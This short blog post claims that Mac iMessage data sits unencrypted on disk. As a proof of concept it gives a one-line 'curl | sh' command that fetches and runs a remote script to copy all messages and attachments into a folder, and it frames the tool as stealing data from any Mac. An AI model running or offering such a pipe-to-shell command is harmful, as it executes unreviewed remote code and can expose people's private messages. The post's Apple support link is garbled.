---
title: Steal all of your iMessages

---

Apple touts the [security of its
iMessage service](https://support.apple.com/en-us/HT20700://support.apple.com/en-us/HT207006).
It turns out, locally, the data is sitting unencrypted ready for taking.

As a proof of concept I made a small utility to read all the iMessage data on
a computer and turn into a web archive. One folder with all of your attachments
and messages ready to peruse. Better yet, I made it easy to run on any Mac. Just
open up a terminal and run:

<div class='boom-script'>
  <pre><code>curl -s www.jpoz.net/mz | sh</code></pre>
</div>

Go to the user's home folder and you'll find a `messages` directory.

Enjoy! Don't do bad things with it.
